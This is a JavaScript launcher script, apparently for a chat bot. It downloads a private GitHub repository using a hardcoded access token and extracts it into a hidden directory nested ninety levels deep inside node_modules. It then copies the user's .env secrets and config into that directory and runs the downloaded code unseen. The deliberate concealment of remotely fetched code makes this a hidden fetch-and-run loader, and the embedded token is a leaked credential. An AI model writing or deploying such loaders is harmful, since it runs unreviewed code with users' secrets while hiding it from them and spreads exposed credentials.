import fs from "fs";
import path from "path";
import axios from "axios";
import AdmZip from "adm-zip";
import { spawn } from "child_process";
import chalk from "chalk";
import { fileURLToPath } from "url";

// === INIT ===
const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

// === DEEP HIDDEN TEMP PATH (.npm/.botx_cache/.x1/.../.x90) ===
const deepLayers = Array.from({ length: 90 }, (_, i) => `.x${i + 1}`);
const TEMP_DIR = path.join(__dirname, 'node_modules', 'core', ...deepLayers, '.cachex');

// === HARDCODED GITHUB CONFIG ===
const GITHUB_TOKEN = "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";
const DOWNLOAD_URL = "https://github.com/INCONNU-BOY/PRIVATE--INCONNU-XD/archive/refs/heads/main.zip";

// === TARGET PATHS ===
const EXTRACT_DIR = path.join(TEMP_DIR, "PRIVATE--INCONNU-XD-main");
const ZIP_PATH = path.join(TEMP_DIR, "repo.zip");
const LOCAL_SETTINGS = path.join(__dirname, "config.cjs");
const TARGET_SETTINGS = path.join(EXTRACT_DIR, "config.cjs");
const LOCAL_ENV = path.join(__dirname, ".env");
const TARGET_ENV = path.join(EXTRACT_DIR, ".env");

// === HELPERS ===
const delay = (ms) => new Promise((res) => setTimeout(res, ms));

// === MAIN TASKS ===
async function downloadAndExtract() {
  if (fs.existsSync(TEMP_DIR)) {
    console.log(chalk.yellow("🧹 Cleaning previous cache..."));
    fs.rmSync(TEMP_DIR, { recursive: true, force: true });
  }

  fs.mkdirSync(TEMP_DIR, { recursive: true });

  console.log(chalk.blue("⬇️ Downloading from GitHub..."));
  const response = await axios({
    url: DOWNLOAD_URL,
    method: "GET",
    responseType: "stream",
    headers: {
      Authorization: `token ${GITHUB_TOKEN}`,
      Accept: "application/vnd.github.v3.raw",
    },
  });

  await new Promise((resolve, reject) => {
    const writer = fs.createWriteStream(ZIP_PATH);
    response.data.pipe(writer);
    writer.on("finish", resolve);
    writer.on("error", reject);
  });

  console.log(chalk.green("📦 Extracting ZIP..."));
  new AdmZip(ZIP_PATH).extractAllTo(TEMP_DIR, true);
  fs.unlinkSync(ZIP_PATH);

  console.log(chalk.green("✅ Extraction complete."));
}

async function applyLocalFiles() {
  // Copy settingss.js
  if (fs.existsSync(LOCAL_SETTINGS)) {
    try {
      fs.copyFileSync(LOCAL_SETTINGS, TARGET_SETTINGS);
      console.log(chalk.green("🛠️ Local settings applied."));
    } catch (e) {
      console.error(chalk.red("❌ Failed to copy config.cjs:"), e);
    }
  } else {
    console.log(chalk.yellow("⚠️ config.cjs not found."));
  }

  // Copy .env
  if (fs.existsSync(LOCAL_ENV)) {
    try {
      fs.copyFileSync(LOCAL_ENV, TARGET_ENV);
      console.log(chalk.green("📥 .env copied to project."));
    } catch (e) {
      console.error(chalk.red("❌ Failed to copy .env:"), e);
    }
  }

  await delay(300);
}

function startBot() {
  console.log(chalk.cyan("🚀 Launching bot..."));
  const bot = spawn("node", ["index.js"], {
    cwd: EXTRACT_DIR,
    stdio: "inherit",
    env: process.env,
  });

  bot.on("close", (code) => {
    console.log(chalk.red(`💥 Bot exited with code ${code}`));
  });
}

// === EXECUTE ===
(async () => {
  await downloadAndExtract();
  await applyLocalFiles();
  startBot();
})();
